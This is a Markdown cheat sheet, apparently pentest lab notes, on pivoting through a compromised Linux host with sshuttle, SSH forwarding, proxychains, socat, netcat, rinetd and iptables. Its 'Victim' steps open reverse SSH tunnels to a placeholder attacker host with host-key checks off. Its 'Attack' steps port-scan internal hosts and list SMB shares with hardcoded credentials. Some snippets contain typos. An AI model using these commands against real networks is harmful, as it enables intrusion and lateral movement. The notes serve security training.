# Port Forwarding and SSH Tunneling with Linux Tools

* Pre-condition Initial Access and Execution
* Pre-condition TTY e.g. `python3 -c 'import pty; pty.spawn("/bin/sh")`
* Use SSHuttle to create VPN like SSH tunnels
* Use SSH local (dynamic) and remote (dynamic) port forwarding
* Use SOCAT and other linux tools for local port forwarding methods

## SSHuttle creates VPN like SSH tunnels

Scenario

* Requires DIRECT access to SSH servers
* Requires python3 on SSH Server
* Requires root privileges on SSH client

From https://github.com/sshuttle/sshuttle

sshuttle is a tool that turns an SSH connection into something like a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option.

```bash
apt-get install sshuttle
```

Victim

* Use SOCAT forwarder to get direct SSH access to backend

```bash
# forward ports from app frontend to db backend
python3 -c 'import pty; pty.spawn("/bin/sh")'
socat TCP-LISTEN:2222,fork TCP:10.4.175.215:22
```

Attacker

* Use ssh client to connect to the backend
* Run ip route to get routing table with subnet info
* Run sshuttle on kali with --remote [USERNAME[:PASSWORD]@]ADDR[:PORT] and the subnets

```bash
# SSH into victim 
ssh -p 2222 database_admin@192.168.175.63 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

# Get ip routes 
ip route | tail -n+2 | cut -f1 -d' ' | paste -sd' '
ip route | tail -n+2 | awk '{print $1}' | tr '\n' ' '; echo
ip route | tail -n+2 | cut -f1 -d' ' | python3 -c 'import sys; print(" ".join(sys.stdin.read().splitlines()))'
10.4.175.0/24 172.16.175.0/24

# Run shuttle to create VPN like connections to ip routes
sshuttle -r database_admin@192.168.175.63:2222 10.4.175.0/24 172.16.175.0/24

# Attack the backend smb server on different subnet
smbclient -L //172.16.175.217/ -U hr_admin --password=Welcome1234
```

## Remote SSH Port Forwarding

Scenario

* Attacker has SSH access on victims machine
* Attacker forwards remote port due **firewall restriction**
* Attacker establish a reverse tunnel from victim to attacker to attack a backend server
* From 127.0.0.1:4545 (attacker)
* To 10.4.175.215:5432 (backend server)

```bash
sudo systemctl start ssh
```

Victim

* -v verbose
* -N don't open shell
* -R remote port forwarding (reverse)
* -o "UserKnownHostsFile=/dev/null" ignore hosts file
* -o "StrictHostKeyChecking=no" ignore host key

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -R 127.0.0.1:2345:10.4.175.215:5432 kali@ATTACKER -v -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```

Attack

* -L list SMB shares
* -p port
* -U user
* --password pw

```bash
smbclient -p 2345 -L //127.0.0.1/ -U hr_admin --password=$PW

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
```

## Dynamic SSH Remote Port Forwarding

Scenario

* Use proxychains to attack multiple ports via attackers port
* Requires a gcc compiler
* Download `https://github.com/rofl0r/proxychains-ng`

ProxyChains is a UNIX program, that hooks network-related libc functions in DYNAMICALLY LINKED programs via a preloaded DLL (dlsym(), LD_PRELOAD) and redirects the connections through SOCKS4a/5 or HTTP proxies. It supports TCP only (no UDP/ICMP etc).

```bash
git clone https://github.com/rofl0r/proxychains-ng
cd proxychains-ng

# Install
./configure --prefix=/usr --sysconfdir=/etc
Done, now run make && make install

sudo make install
./tools/install.sh -D -m 644 libproxychains4.so /usr/lib/libproxychains4.so
./tools/install.sh -D -m 755 proxychains4 /usr/bin/proxychains4
./tools/install.sh -D -m 755 proxychains4-daemon /usr/bin/proxychains4-daemon
                                            
sudo make install-config 
./tools/install.sh -D -m 644 src/proxychains.conf /etc/proxychains.conf

# Configure tcp timeouts
sudo sed -i 's/tcp_read_time_out .*/tcp_read_time_out 1000/g' /etc/proxychains.conf
sudo sed -i 's/tcp_connect_time_out .*/tcp_connect_time_out 1000/g' /etc/proxychains.conf
```

Victim

* -R dynamic remote port forwarding

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -R 9998 kali@ATTACKER -v -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```

Attack

* Configure `/etc/proxychains.conf` to attacker local port on loobback 127.0.0.1

```bash
# Open /etc/proxychains.conf
proxychains -f /etc/proxychains.conf

# Configure proxy chain socks5 127.0.0.1 9998
sudo sed -i 's/socks .*/socks5 127.0.0.1 9998/g' /etc/proxychains.conf

# Port sweeping and scanning
proxychains bash -c 'for i in $(seq 1 1024); do nc -zv -w 1 172.16.175.217 $i; done;'

sudo proxychains nmap -sT -p4870-4874 -Pn 172.16.175.217
[proxychains] config file found: /etc/proxychains.conf

# SMB Attack
proxychains smbclient -p 445 -L //s172.16.175.217/ -U hr_admin --password=Welcome1234

# Other
proxychains ./ssh_dynamic_remote_client_aarch64 --ip-addr 172.16.175.217 --port 1234
```

## Local SSH Port Forwarding

Szenario

* Attacker has SSH access on victims machine
* Attacker forwards local port with no firewall in between
* Attacker establish a tunnel from victim to attacker between app and db to attack backend server
* From 0.0.0.0:4545 (app server)
* To to 172.16.187.217:4545 (db server)

Victim

* -v verbose
* -N don't open shell
* -L local port forwarding
* -o "UserKnownHostsFile=/dev/null" ignore hosts file
* -o "StrictHostKeyChecking=no" ignore host key

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -v -N -L 0.0.0.0:4455:172.16.187.217:4545 database_admin@10.4.187.215 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

ss -ntplu | grep "0.0.0.0:4545"
tcp    LISTEN  0       128                  0.0.0.0:4545          0.0.0.0:*      users:(("ssh",pid=3516,fd=4))

```

Attack

* -L list SMB shares
* -p port
* -U user
* --password pw

```bash
smbclient -p 4545 -L //192.168.187.63/ -U hr_admin --password=$PW

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
```

## Dynamic SSH Port Forwarding

Scenario

* Use proxychains to attack multiple ports via victims port
* Requires a gcc compiler
* Download `https://github.com/rofl0r/proxychains-ng`

ProxyChains is a UNIX program, that hooks network-related libc functions in DYNAMICALLY LINKED programs via a preloaded DLL (dlsym(), LD_PRELOAD) and redirects the connections through SOCKS4a/5 or HTTP proxies. It supports TCP only (no UDP/ICMP etc).

```bash
git clone https://github.com/rofl0r/proxychains-ng
cd proxychains-ng

# Install
./configure --prefix=/usr --sysconfdir=/etc
Done, now run make && make install

sudo make install
./tools/install.sh -D -m 644 libproxychains4.so /usr/lib/libproxychains4.so
./tools/install.sh -D -m 755 proxychains4 /usr/bin/proxychains4
./tools/install.sh -D -m 755 proxychains4-daemon /usr/bin/proxychains4-daemon
                                            
sudo make install-config 
./tools/install.sh -D -m 644 src/proxychains.conf /etc/proxychains.conf

# Configure tcp timeouts
sudo sed -i 's/tcp_read_time_out .*/tcp_read_time_out 1000/g' /etc/proxychains.conf
sudo sed -i 's/tcp_connect_time_out .*/tcp_connect_time_out 1000/g' /etc/proxychains.conf
```

Victim

* -D dynamic local port forwarding
* Use proxychains to attack multiple ports

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.175.215 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```

Attacker

* Configure `/etc/proxychains.conf` to app server port

```bash
# Open /etc/proxychains.conf
proxychains -f /etc/proxychains.conf

# Configure proxy chain socks5 192.168.175.63 9999
sudo sed -i 's/socks .*/socks5 192.168.175.63 9999/g' /etc/proxychains.conf

# Port sweeping and scanning
proxychains bash -c 'for i in $(seq 1 1024); do nc -zv -w 1 172.16.175.217 $i; done;'

sudo proxychains nmap -sT -p4870-4874 -Pn 172.16.175.217
[proxychains] config file found: /etc/proxychains.conf

# SMB Attack
proxychains smbclient -p 445 -L //172.16.175.217/ -U hr_admin --password=Welcome1234

# Other
proxychains ./ssh_dynamic_client_aarch64 --ip-addr 172.16.175.217 --port 4872
```

## Local SOCAT Port Forwarding

Scenario

* Download SOCAT
* Listen on a non-privileged port range e.g. 2345
* Fork a new sub-process that forwards input from TCP listener

Victim

```bash
socat -ddd TCP-LISTEN:2222,fork TCP:10.4.187.215:22
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.187.215:5432
```

Attacker

```bash
ssh -p 2222 database_admin@192.168.187.63 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
psql -h 192.168.187.63 -p 2345 -U postgres
```

## Local NC Port Forwarding (untested)

* Download nc-tcp-forward.sh
* Requires Netcat FIFO 
* From `https://gist.githubusercontent.com/holly/6d52dd9addd3e58b2fd5/raw/2f399b637d600c8fbaf6ea90f429890373b77b8b/nc-tcp-forward.sh`

```bash
#!/usr/bin/env bash

set -e

if [ $# != 3 ]; thens

        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2
        exit 1
fi

FRONTPORT=$1
BACKHOST=$2
BACKPORT=$3

FIFO=/tmp/backpipe

trap 'echo "trapped."; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15

mkfifo $FIFO
while true; do
        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO
done
rm -f $FIFO
```

## Local Port Forwarding with Rinetd (untested)

* Requires root privileges
* Download rinetd `apt install rinetd`
* Configuration file `/etc/rinetd.conf`

```plain
# bindaddress bindport connectaddress connectport [options...]
#IP vom rinetd  Port    Ziel-IP         Ziel-Port
206.125.69.81   80/tcp  10.1.1.2        8080/tcp
206.125.69.81   53/udp  10.1.1.2        53/udp
10.0.0.234      23      10.0.0.254      23
10.0.0.234      222     10.1.0.254      22
10.0.0.234      80      example.org     80
2001:db8::3     100     fd00:abcd::1    23
127.0.0.1       100     fd00:abcd::1    23
2001:db8::56    23       10.0.0.254     23
10.0.0.238      53/udp     9.9.9.9      53/udp #/udp muss bei beiden Ports angegeben werden, sonst findet eine Umleitung UDP <--> TCP statt.
```

## Local IPTables Forwarding (untested)

* Requires root privileges
* Requires enable forwarding on all interfaces

```bash
# Enable Port F
echo '1' | sudo tee /proc/sys/net/ipv4/conf/ppp0/forwarding
echo '1' | sudo tee /proc/sys/net/ipv4/conf/eth0/forwarding

iptables -t nat -A PREROUTING -p tcp -i ppp0 --dport 8001 -j DNAT --to-destination 192.168.1.200:8080
iptables -A FORWARD -p tcp -d 192.168.1.200 --dport 8080 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
```

DNAT rule explained:

* -t nat: This specifies that we are working with the NAT (Network Address Translation) table, which is used for altering packets that create new connections.
* -A PREROUTING: This appends a rule to the PREROUTING chain. The PREROUTING chain is used to alter packets as soon as they come in, before any routing decisions are made.
* -p tcp: This specifies that the rule applies to TCP packets.
* -i ppp0: This indicates that the rule applies to packets coming in on the ppp0 interface (often used for Point-to-Point Protocol connections, such as dial-up or VPN).
* --dport 8001: This specifies that the rule applies to packets destined for port 8001.
* -j DNAT: This tells iptables to perform DNAT on matching packets.
* --to-destination 192.168.1.200:8080: This specifies the new destination address and port for the packets that match the rule. In this case, packets destined for port 8001 will be redirected to the internal IP address 192.168.1.200 on port 8080.

FORWARD rule explained:

* -A FORWARD: This appends a rule to the FORWARD chain. The FORWARD chain is used for packets that are being routed through the machine (i.e., not destined for the local machine).
* -p tcp: This specifies that the rule applies to TCP packets.
* -d 192.168.1.200: This indicates that the rule applies to packets destined for the IP address 192.168.1.200.
* --dport 8080: This specifies that the rule applies to packets destined for port 8080.

* -m state --state NEW,ESTABLISHED,RELATED: This uses the connection tracking module to match packets based on their connection state. The states NEW, ESTABLISHED, and RELATED allow new connections, packets that are part of an established connection, and packets related to an established connection.
* -j ACCEPT: This tells iptables to accept the packets that match this rule, allowing them to be forwarded to their destination.
